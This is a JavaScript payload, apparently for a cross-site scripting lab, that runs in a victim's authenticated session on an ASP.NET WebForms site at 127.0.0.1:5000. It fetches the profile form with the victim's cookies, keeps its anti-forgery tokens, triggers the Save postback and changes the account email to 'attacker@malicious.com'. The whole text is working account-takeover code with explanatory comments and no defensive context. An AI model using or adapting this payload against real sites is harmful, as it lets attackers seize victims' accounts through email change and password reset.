;(async()=>{
  // Fetch the account page to get valid form values
  const html = await fetch("http://127.0.0.1:5000/profile", {
    credentials: "include"  // Include cookies for authenticated request
  }).then(r=>r.text());

  // Parse the HTML response
  const doc = new DOMParser().parseFromString(html,"text/html");
  const form = doc.querySelector("form");

  // Get the form's action URL
  const base = "http://127.0.0.1:5000/profile";
  const action = new URL(form.getAttribute("action"), base).href;

  // Extract all form data (including CSRF tokens)
  const data = new FormData(form);

  // Set the target button that would normally be clicked
  data.set("__EVENTTARGET", "ctl00$Main$btnSave$btnPrimary");
  data.set("__EVENTARGUMENT", "");
  
  // Change the email to one we control
  data.set("ctl00$Main$txtEmail$txtText", "attacker@malicious.com");

  // Submit the modified form
  const res = await fetch(action, {
    method: "POST",
    credentials: "include",
    body: data
  });

  console.log(res.ok ? "Profile updated successfully!" : "Failed to update profile", res.status);
})();

